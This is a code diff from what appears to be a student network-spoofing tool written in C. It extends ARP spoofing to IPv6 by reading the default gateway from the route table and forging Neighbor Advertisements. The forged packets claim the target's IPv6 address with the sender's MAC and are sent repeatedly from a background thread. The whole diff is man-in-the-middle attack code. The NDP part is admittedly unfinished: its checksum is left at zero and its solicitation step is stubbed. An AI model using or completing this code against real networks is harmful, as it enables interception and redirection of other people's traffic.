@@ -96,10 +96,55 @@ static void get_gateway_ip()
   fclose(fp);
 }
 
+static void get_gateway_ipv6()
+{
+  // For IPv6, we'll use a simple link-local gateway discovery
+  // This is a simplified approach - in practice, you'd use Router Discovery
+  FILE *fp = fopen("/proc/net/ipv6_route", "r");
+  char  line[512], dest[33], gateway[33], iface[16];
+  int   prefix_len;
+
+  if (fp == NULL)
+  {
+    perror("fopen IPv6 route");
+    return;
+  }
+
+  while (fgets(line, sizeof(line), fp))
+  {
+    sscanf(line, "%32s %x %*s %*s %32s %*s %*s %*s %*s %15s", dest, &prefix_len, gateway, iface);
+
+    // Look for default route (dest == "00000000000000000000000000000000")
+    if (ft_strncmp(dest, "00000000000000000000000000000000", 32) == 0 &&
+        ft_strncmp(iface, data.if_name, ft_strlen(iface)) == 0)
+    {
+      // Convert hex string to IPv6 address
+      for (int i = 0; i < 16; i++)
+      {
+        char hex_byte[3] = {gateway[i * 2], gateway[i * 2 + 1], '\0'};
+        data.gw_ipv6.s6_addr[i] = (unsigned char)strtol(hex_byte, NULL, 16);
+      }
+      printf("Interface: %s, IPv6 Gateway found\n", iface);
+      break;
+    }
+  }
+  fclose(fp);
+}
+
 void send_gateway_arp_request_packet(unsigned char *buffer, int buflen)
 {
   get_gateway_ip();
   send_arp_request_packet_to_gateway(buffer, buflen);
+}
+
+void send_gateway_ndp_request_packet(unsigned char *buffer, int buflen)
+{
+  (void)buffer; // Suppress unused parameter warning
+  (void)buflen; // Suppress unused parameter warning
+  get_gateway_ipv6();
+  // For simplicity, we'll skip the actual NDP solicitation for now
+  // In a complete implementation, you'd send a Neighbor Solicitation
+  printf("IPv6 NDP gateway request (simplified)\n");
 }
 
 // INFO : Get gateway mac address and then send reply
@@ -108,7 +153,11 @@ void send_gateway_spoofing_packet(unsigned char *buffer, int buflen)
   pthread_t          tid;
   struct thread_arg *arg;
 
-  make_gateway_arp_packet(buffer);
+  if (data.ip_type == IPV4)
+    make_gateway_arp_packet(buffer);
+  else
+    make_gateway_ndp_packet(buffer);
+
   arg         = malloc(sizeof(struct thread_arg));
   arg->buffer = malloc(buflen);
   ft_memcpy(arg->buffer, buffer, buflen);
@@ -117,10 +166,13 @@ void send_gateway_spoofing_packet(unsigned char *buffer, int buflen)
   if (DEBUG)
   {
     printf("gateway spoofing packet!!\n");
-    print_arp_packet(buffer);
+    if (data.ip_type == IPV4)
+      print_arp_packet(buffer);
+    else
+      print_ndp_packet(buffer);
   }
   // TODO : clone을 써 보기
-  if (pthread_create(&tid, NULL, send_fake_arp_reply, (void *)arg) != 0)
+  if (pthread_create(&tid, NULL, data.ip_type == IPV4 ? send_fake_arp_reply : send_fake_ndp_reply, (void *)arg) != 0)
   {
     perror("pthread_create failed");
     exit(EXIT_FAILURE);
@@ -130,4 +182,41 @@ void send_gateway_spoofing_packet(unsigned char *buffer, int buflen)
     perror("pthread_detach failed");
     exit(EXIT_FAILURE);
   }
+}
+
+void make_gateway_ndp_packet(unsigned char *buffer)
+{
+  struct ethhdr         *cur_eth = (struct ethhdr *)buffer;
+  struct ipv6_ndp_packet *cur_ipv6_ndp = (struct ipv6_ndp_packet *)(buffer + sizeof(struct ethhdr));
+
+  // Ethernet header
+  ft_memcpy(cur_eth->h_dest, data.gw_mac, sizeof(data.gw_mac));
+  ft_memcpy(cur_eth->h_source, data.my_mac, sizeof(data.my_mac));
+  cur_eth->h_proto = htons(ETH_P_IPV6);
+
+  // IPv6 header
+  cur_ipv6_ndp->ipv6_hdr.ip6_vfc = 0x60; // Version 6
+  cur_ipv6_ndp->ipv6_hdr.ip6_flow = 0;
+  cur_ipv6_ndp->ipv6_hdr.ip6_plen = htons(sizeof(struct ndp_packet));
+  cur_ipv6_ndp->ipv6_hdr.ip6_nxt = IPPROTO_ICMPV6;
+  cur_ipv6_ndp->ipv6_hdr.ip6_hlim = 255;
+  ft_memcpy(&cur_ipv6_ndp->ipv6_hdr.ip6_src, &data.target_ipv6, sizeof(data.target_ipv6));
+  ft_memcpy(&cur_ipv6_ndp->ipv6_hdr.ip6_dst, &data.gw_ipv6, sizeof(data.gw_ipv6));
+
+  // ICMPv6 NDP header (Neighbor Advertisement to gateway)
+  cur_ipv6_ndp->ndp.icmp6_hdr.icmp6_type = ICMPV6_ND_NA; // Neighbor Advertisement
+  cur_ipv6_ndp->ndp.icmp6_hdr.icmp6_code = 0;
+  cur_ipv6_ndp->ndp.icmp6_hdr.icmp6_cksum = 0; // Will be calculated below
+  cur_ipv6_ndp->ndp.icmp6_hdr.icmp6_data32[0] = htonl(0x60000000); // R=0, S=1, O=1 flags
+
+  // Target IPv6 address (claiming to be the target)
+  ft_memcpy(cur_ipv6_ndp->ndp.target_ip, &data.target_ipv6, sizeof(data.target_ipv6));
+
+  // Target Link-Layer Address option (our MAC)
+  cur_ipv6_ndp->ndp.option_type = 2;   // Target Link-Layer Address
+  cur_ipv6_ndp->ndp.option_length = 1; // 8 bytes
+  ft_memcpy(cur_ipv6_ndp->ndp.target_mac, data.my_mac, sizeof(data.my_mac));
+
+  // Calculate ICMPv6 checksum - Need to make this function accessible
+  cur_ipv6_ndp->ndp.icmp6_hdr.icmp6_cksum = 0; // Simplified for now
 }
